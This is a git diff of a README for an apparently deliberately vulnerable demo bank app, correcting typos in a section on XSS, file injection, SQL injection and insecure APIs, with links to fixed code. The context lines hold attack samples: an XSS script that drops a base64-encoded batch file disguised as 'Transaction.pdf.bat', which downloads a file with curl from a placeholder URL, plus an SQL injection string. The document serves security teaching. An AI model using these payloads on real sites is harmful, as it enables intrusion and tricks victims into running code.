@@ -69,7 +69,7 @@ Together, let's navigate the challenges of cloud architectures and security by e
     - This link has R-XSS [https://shorturl.at/ckvAF] which is infected with: 
         ```HTML
         <script>
-            fileName = "Tranaction.pdf.bat";
+            fileName = "Transaction.pdf.bat";
             fileData = "QGVjaG8gb2ZmDQoNCjo6IERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgZmlsZSBvbiBHaXRIdWINCnNldCBmaWxlVXJsPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS91c2VybmFtZS9yZXBvL21haW4vcGF0aC90by9maWxlLnR4dA0KDQo6OiBEZWZpbmUgdGhlIHRhcmdldCBkaXJlY3Rvcnkgd2hlcmUgeW91IHdhbnQgdG8gc2F2ZSB0aGUgZmlsZQ0Kc2V0IHRhcmdldERpcj1DOi8vDQoNCjo6IENyZWF0ZSB0aGUgdGFyZ2V0IGRpcmVjdG9yeSBpZiBpdCBkb2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiV0YXJnZXREaXIlIiBta2RpciAiJXRhcmdldERpciUiDQoNCjo6IFVzZSBjdXJsIHRvIGRvd25sb2FkIHRoZSBmaWxlDQpjdXJsIC1vICIldGFyZ2V0RGlyJVxmaWxlLnR4dCIgIiVmaWxlVXJsJSINCg==";
 
             function base64tobytes(base64Adata){
@@ -102,34 +102,34 @@ Together, let's navigate the challenges of cloud architectures and security by e
         ```HTML 
         <span onmouseover="window.location='try.php?url='+encodeURIComponent(window.location.href)">Hover over me</span>
         ```
-    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/support_request.php#L38), Here htmlspecialchars is used for encoding response...
+    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/support_request.php#L38), Here html special chars is used for encoding response...
 
 3. File Injection
     - File Injection is a security vulnerability where an attacker can manipulate or inject malicious files, typically to exploit a system's processing and execute unauthorized code or access sensitive data, potentially compromising system integrity and security.
     - CVE code: ```CVE-2020-25048```
-    - In ITB, [Support Page]'s Attachments feild is vulnerable to file injection.
+    - In ITB, [Support Page]'s Attachments field is vulnerable to file injection.
     - Sample Code to demonstrate it:
         ```HTML
         ./try.php
         ```
-    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/support_request.php#L85), Here we are cheacking file type and file format...
+    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/support_request.php#L85), Here we are checking file type and file format...
 4. SQL Injection
     - SQL Injection is a malicious technique where an attacker inserts or manipulates SQL queries within an web app's input fields, potentially allowing unauthorized access, data retrieval, modification, or deletion in a connected database, posing significant security risks.
     - CVE code: ```CVE-2023-4485```
-    - In ITB, [LogIn Page]'s password feild is vulnerable to SQL injection.
+    - In ITB, [LogIn Page]'s password field is vulnerable to SQL injection.
     - Sample Code to demonstrate it:
         ```HTML
         NO' OR '1' = '1
         ```
-    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/login_process.php#L37), Here database query is getting genrated using prepare statement...
+    - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/login_process.php#L37), Here database query is getting generated using prepare statement...
     
 5. Insecure API
     - Insecure API refers to an application programming interface that lacks proper security measures, making it susceptible to various threats such as data breaches, unauthorized access, and manipulation, highlighting the need for robust security practices to protect sensitive data and ensure the integrity of communication.
     - CVE code: ```CVE-2023-40729```
-    - In ITB, all data in [Dashboard Page] is coming thorugh insecure API.
+    - In ITB, all data in [Dashboard Page] is coming through insecure API.
     - [Fixed Code](https://github.com/Hritikpatel/SecureTrust_Bank/blob/7fd1f9ecdcb369344c297486a502881b55ab6916/assets/php_process/api.php#L29), Here we are forwarding SQL response to client after encrypting data in base64...
 
-## Vulnerablity mentioned above are showcased in [ITB]
+## Vulnerability mentioned above are showcased in [ITB]
 
 
 [//]: #
